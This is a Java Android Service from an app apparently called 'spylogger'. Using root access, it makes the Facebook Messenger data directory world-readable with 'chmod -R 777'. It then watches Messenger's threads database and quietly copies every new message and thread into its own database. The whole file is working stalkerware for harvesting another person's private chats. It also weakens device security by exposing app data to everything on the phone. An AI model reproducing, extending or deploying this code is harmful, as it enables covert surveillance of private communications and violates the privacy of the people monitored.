package com.gravatasufoca.spylogger.services;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Binder;
import android.os.FileObserver;
import android.os.IBinder;
import android.util.Log;

import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookThreads;
import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperInternal;
import com.gravatasufoca.spylogger.model.messenger.Messages;
import com.gravatasufoca.spylogger.model.messenger.Thread;
import com.gravatasufoca.spylogger.model.Configuracao;
import com.j256.ormlite.dao.Dao;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import java.io.File;
import java.io.IOException;
import java.sql.SQLException;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class MessengerService extends Service {

	private String pathToWatch;
	private Dao<Messages, Integer> daoMensagensInterno;
	private Dao<Messages, Integer> daoMensagensExterno;

	private Dao<Thread, Integer> daoThreadsInterno;
	private Dao<Thread, Integer> daoThreadssExterno;


	private DatabaseHelperInternal internal;
	private DatabaseHelperFacebookThreads external;
	private Configuracao configuracao;
    private final IBinder mBinder = new LocalBinder();
    private boolean loaded=false;

    public class LocalBinder extends Binder {
    	MessengerService getService() {
            return MessengerService.this;
        }
    }

	public MessengerService() {
	}

	@Override
	public IBinder onBind(Intent intent) {
		return mBinder;
	}

	private void chmod() {

		try{
			CommandCapture command = new CommandCapture(0, "chmod -R 777 "
				+ Utils.FACEBOOK_DIR_PATH, "chmod -R 777 "
						+ getApplicationContext().getPackageManager()
						.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir);

			if(RootTools.isAccessGiven())
				RootTools.getShell(true).add(command);

		}catch(Exception e){
			e.printStackTrace();
		}

	}

	@Override
	public void onCreate() {
		createDatabase();
	}

	private void createDatabase(){
		pathToWatch = DatabaseHelperFacebookThreads.DATABASE_NAME;

		chmod();
		try {
			String inFileName = getApplicationContext().getPackageManager()
					.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
					+ "/databases/"+DatabaseHelperInternal.DATABASE_NAME;

			File dest = new File(inFileName);

			if (!dest.exists()) {

				File source = new File(pathToWatch);
				try {

					File dir = new File(
							getApplicationContext().getPackageManager()
									.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
									+ "/databases/");
					if (!dir.exists())
						dir.mkdir();

					dest.createNewFile();
					Utils.copyFile(source, dest);
				} catch (IOException e) {
					e.printStackTrace();
				}
			}

		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}
	}

	private void clearDatabase(){
		try {
			File base = new File(
					getApplicationContext().getPackageManager()
							.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
							+ DatabaseHelperInternal.DATABASE_NAME);
			if(base.exists()){
				base.delete();
			}

		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}
	}


	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		Log.d("FACESLOG - FLAGS", Integer.toString(flags));
		chmod();
		internal = new DatabaseHelperInternal(getApplicationContext());
		external = new DatabaseHelperFacebookThreads(getApplicationContext());

		try {
			daoMensagensInterno = internal.getMessagesDao();
			daoMensagensExterno = external.getMessagesDao();
			daoThreadsInterno = internal.getThreadDao();
			daoThreadssExterno = external.getThreadDao();
			if(!daoMensagensInterno.isTableExists()){
				clearDatabase();
				createDatabase();
				daoMensagensInterno = internal.getMessagesDao();
				daoMensagensExterno = external.getMessagesDao();
				daoThreadsInterno = internal.getThreadDao();
				daoThreadssExterno = external.getThreadDao();
			}

		} catch (Exception e) {
			e.printStackTrace();
		}

		if(Utils.faceObserver==null)
			setObserver();

		Log.d("FACESLOG - OBSESRVER", Utils.faceObserver.toString());
		return START_REDELIVER_INTENT;
	}

	private void setObserver(){
		Utils.faceObserver = new FileObserver(pathToWatch) { // set up a file observer to
			// watch this directory on
			// sd card

			@Override
			public void onEvent(int event, String file) {

				switch (event) {
				case FileObserver.MODIFY:
					Log.d("FACES LOGGER", "MODIFY:" + pathToWatch + file);
					updateThread();
					updateMsg();
					break;
				default:
					// just ignore
					break;
				}

			}
		};
		Utils.faceObserver.startWatching(); // START OBSERVING
	}


	public Configuracao getConfiguracao() {
		if(configuracao==null){
			DatabaseHelper database = new DatabaseHelper(
					getApplicationContext());
			List<Configuracao> confs;
			try {
				confs = database.getConfiguracaoDao().queryForAll();
				Configuracao conf = null;

				if (confs.size() > 0) {
					conf = confs.get(0);
				}
				if (conf != null) {
					configuracao=conf;
				}
			} catch (Exception e) {
			}
		}
		return configuracao;
	}


	private void updateThread() {

		try {
			List<Thread> threads = daoThreadsInterno.queryForAll();
			List<Thread> m = daoThreadssExterno.queryForAll();
			Set<Thread> nova = new HashSet<Thread>();
			for (Thread thread : m) {

				if (!threads.contains(thread)) {
					nova.add(thread);
				}

			}

			for (Thread thread : nova) {
				try {
					daoThreadsInterno.create(thread);
				} catch (SQLException e) {
					e.printStackTrace();
				}
			}

		} catch (SQLException e) {
			e.printStackTrace();
		}
	}

	private void updateMsg() {

		try {
			List<Messages> mensagens = daoMensagensInterno.queryForAll();
			List<Messages> m = daoMensagensExterno.queryForAll();
			Set<Messages> nova = new HashSet<Messages>();
			for (Messages mensagem : m) {

				if (!mensagens.contains(mensagem)) {
					nova.add(mensagem);
				}

			}

			for (Messages mensagem : nova) {
				try {
					daoMensagensInterno.create(mensagem);
				} catch (SQLException e) {
					e.printStackTrace();
				}
			}

		} catch (SQLException e) {
			e.printStackTrace();
		}
	}
}